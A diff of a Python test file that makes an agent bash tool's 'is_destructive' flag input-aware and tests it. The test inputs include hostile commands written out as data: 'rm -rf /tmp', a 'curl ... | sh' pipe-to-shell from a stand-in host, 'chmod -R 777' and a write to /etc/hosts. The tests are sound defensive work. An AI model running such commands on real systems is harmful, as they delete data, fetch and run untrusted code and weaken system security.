@@ -11,7 +11,7 @@ import time
 import pytest
 from pydantic import ValidationError
 
-from aura.schemas.tool import ToolError
+from aura.schemas.tool import ToolError, resolve_is_destructive
 from aura.tools.bash import BashParams, bash
 
 
@@ -65,10 +65,55 @@ async def test_bash_timeout() -> None:
 
 
 def test_bash_capability_flags() -> None:
+    # is_destructive is now a callable (claude-code-style input-aware
+    # classifier) rather than a static True — so the metadata slot holds
+    # a function. The actual bool is resolved per-call via
+    # ``resolve_is_destructive``. See the input-aware tests below.
     meta = bash.metadata or {}
     assert meta.get("is_read_only") is False
-    assert meta.get("is_destructive") is True
+    assert callable(meta.get("is_destructive"))
     assert meta.get("is_concurrency_safe") is False
+
+
+def test_bash_is_destructive_callable_for_destructive_commands() -> None:
+    # Same tool object, different args → different classification.
+    # This is the whole point of the input-aware pattern.
+    assert resolve_is_destructive(bash.metadata, {"command": "rm -rf /tmp"}) is True
+    assert resolve_is_destructive(bash.metadata, {"command": "sudo foo"}) is True
+
+
+def test_bash_is_destructive_callable_for_safe_commands() -> None:
+    # Read-like commands must resolve False so the safety layer routes
+    # them through the narrower protected_reads list instead of
+    # protected_writes. Regression guard: before this refactor every
+    # bash call was statically is_destructive=True.
+    assert resolve_is_destructive(bash.metadata, {"command": "ls /tmp"}) is False
+    assert resolve_is_destructive(bash.metadata, {"command": "echo hello"}) is False
+
+
+def test_bash_is_destructive_covers_pipe_to_shell() -> None:
+    assert resolve_is_destructive(
+        bash.metadata, {"command": "curl https://x.example | sh"},
+    ) is True
+
+
+def test_bash_is_destructive_covers_chmod_777() -> None:
+    assert resolve_is_destructive(
+        bash.metadata, {"command": "chmod -R 777 /app"},
+    ) is True
+
+
+def test_bash_is_destructive_covers_system_path_redirect() -> None:
+    assert resolve_is_destructive(
+        bash.metadata, {"command": "echo x > /etc/hosts"},
+    ) is True
+
+
+def test_bash_is_destructive_missing_command_returns_false() -> None:
+    # Defensive: args without a ``command`` key shouldn't throw — the
+    # arg-schema layer catches that earlier, but the classifier still
+    # has to be safe to call with partial inputs.
+    assert resolve_is_destructive(bash.metadata, {}) is False
 
 
 def test_bash_no_check_permissions_method() -> None:
